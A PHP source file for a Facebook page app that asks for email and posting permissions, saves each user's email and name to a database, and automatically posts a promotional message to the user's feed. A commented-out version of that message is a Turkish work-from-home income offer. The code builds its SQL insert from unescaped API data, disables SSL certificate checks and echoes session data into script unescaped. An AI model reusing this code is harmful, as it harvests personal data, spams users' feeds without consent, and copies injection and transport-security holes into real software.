<?php
@session_start();
?>
<html>
<head>
<title>Admin</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
   </head>
   <body>
   <?php
require_once "face/facebook.php";
require_once "config.php";

Facebook::$CURL_OPTS[CURLOPT_SSL_VERIFYPEER] = false;
Facebook::$CURL_OPTS[CURLOPT_SSL_VERIFYHOST] = 2;
//unset($_SESSION["authok"]);
//die();
$facebook = new Facebook("CURLOPT_SSL_VERIFYAUTH",array(
							'appId'  => $config->appid,
							'secret' => $config->secret,
							'cookie' => true,
							));
//echo 'xxx';
$request = $facebook->getSignedRequest();
if(isset($request['page']['id']) and !empty($request['page']['id'])){
  $_SESSION['pageId']=$request['page']['id'];
}
//echo 'yyy';
if(!$request['page']['liked'] and false)
  {
    ////echo 'bbb';
    require_once 'begen.php';
  }

else{

  //echo 'ccc';
  if(isset($_REQUEST['installed'])){
    // print_r($_REQUEST);
    die();
  }
  //echo 'dddn';
  $user = $facebook->getUser();
  $par = array();
  //echo 'eee';
  $par['scope'] = "publish_stream,email";

  $loginUrl = $facebook->getLoginUrl("feed_email",$par);
  //echo 'fff';
  if ($user) {
    //echo 'ggg';
    $permissions = $facebook->api("/me/permissions");
    if( array_key_exists('publish_stream', $permissions['data'][0]) ){
    $_SESSION["authok"]="true";
    
    /* $attachment = array('message' => 'Ev Hanımlarına 5000TLye Kadar Ek Gelir Uygulamasını Beğendi',
      'name' => 'Ev Hanımlarına Evinde İş İmkanları',
      'caption' => "Bedava Kataloğumuzla Evinizden Çalışarak",
      'link' => 'https://www.facebook.com/EvdeBayanlaraisimkani/app_464834926904787',
      'description' => 'Maaş + SSK + 5000 liraya Kadar Ek Gelire Sahip Olmak İçin Formumuzu Doldurun. Bedavaya İş Ortağımız Olun!. ',
      'picture' => 'https://clicksem.net/Jnvapp/image/ikon-para2.jpg',
      'actions' => array('name' => 'Evinizden Çalışarak 5000 lira Kazanın!',
			       'link' => 'https://www.facebook.com/EvdeBayanlaraisimkani/app_464834926904787 ')
      );
   */
	
    $rowShare=getShare();
    $attachment = array(
			'message' =>$rowShare['message'],
			'name' => $rowShare['name'],
			'caption' => $rowShare['caption'],
			'link' => $rowShare['link'],
			'description' => $rowShare['description'],
			'picture' =>$rowShare['picture'],
			'actions' => array('name' => $rowShare['aname'],
					   'link' =>$rowShare['alink'],
					   ));
 	

    try {
		//echo 'iii';
    $days=date('z');
    $apime=$facebook->api('/me');
    myQuery("insert ignore into jmail(email,name,surname,days) values ('$apime[email]','$apime[first_name]','$apime[last_name]',$days)");
	if(!isset($_SESSION["posted"])){
	  //echo 'kkk';
	  $result = $facebook->api('/me/feed/','post',$attachment);	  	  

	  $_SESSION["posted"]="true";

	  //echo 'lll';
	}
	require_once 'fbform.php';
      } catch (FacebookApiException $e) {
	echo "exception threw:$e";
	$user = null;
      }
      //echo 'mmm';
    }
    else {
      //echo 'nnn';

      echo "	<script type='text/javascript'>
		top.location.href='$loginUrl';
	</script>";
    }
  } else {
    echo "<script type='text/javascript'>
		top.location.href='$loginUrl';
		</script>";
  }
  //echo 'vvv';
}

?>
<script type='text/javascript'> 
  var isInIFrame = (window.location != window.parent.location) ? true : false;

if(false===isInIFrame) top.location.href="http://www.facebook.com/<?php echo $_SESSION[pageId];?>?sk=app_464834926904787";
</script>
</body>
</html>
